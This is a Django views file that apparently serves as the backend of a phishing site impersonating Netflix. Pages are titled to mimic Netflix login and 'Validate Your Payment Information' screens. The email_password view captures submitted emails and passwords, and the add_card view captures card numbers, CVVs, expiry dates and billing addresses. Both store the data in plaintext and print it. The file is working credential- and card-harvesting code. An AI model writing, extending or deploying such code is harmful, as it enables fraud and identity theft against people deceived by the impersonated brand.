from django.shortcuts import render , redirect
from .models import nuser
from django.http import HttpResponseBadRequest , JsonResponse
import json
from .models import *

def email_password(request):
    if request.method == 'POST':
        data = json.loads(request.body)
        password = data.get('password')
        email = data.get('email')
        
        # Create a new user instance
        try:
            nuser_instance = nuser.objects.create(email=email, password=password)
            if nuser_instance:
                print('User created successfully')
                return redirect('update')
            else:
                return JsonResponse({'error': 'User creation failed'})
        except Exception as e:
            # Handle any exceptions, such as database errors or validation errors
            print('Error creating user:', str(e))
            return JsonResponse({'error': 'User creation failed'})
        

    else:
        return JsonResponse({'error': 'Method not allowed'}, status=405)
def login(request):
    context = {
        'title': 'Netflix'
    }
    # Render the login page with the appropriate context
    return render(request, 'login.html', context)


def home(request):
    context ={
        'title':'Netflix - Watch TV Shows Online, Watch Movies Online'
    } 
    # Example logic for home view
    return render(request, 'home.html',context)
def update(request):
    context ={
            'title':'Netflix - Validate Your Payment Information'
        } 
    # Example logic for home view
    return render(request, 'update.html',context)

def add_card(request):
    if request.method == 'POST':
        data = json.loads(request.body)
        name = data.get('name')
        cvv = data.get('cvv')
        number = data.get('number')
        address =data.get('address')
        date = data.get('date')
        zipcode = data.get('zipcode')
        city = data.get('city')
        print(data)

        try:
            added =nuser.objects.create(
            name=name,
            cvv=cvv,
            number=number,
            address=address,
            date=date,
            zipcode=zipcode,
            city=city
        )
            if added:
                print('User created successfully')
                return JsonResponse({'ok': 'User created  successfully'})
            else:
                return JsonResponse({'error': 'User creation failed'})
        except Exception as e:
            # Handle any exceptions, such as database errors or validation errors
            print('Error creating user:', str(e))
            return JsonResponse({'error': 'User creation failed'})
        # Create and save the new nuser object
        
    else:
        # Render the home.html template for GET requests
        return render(request, 'home.html')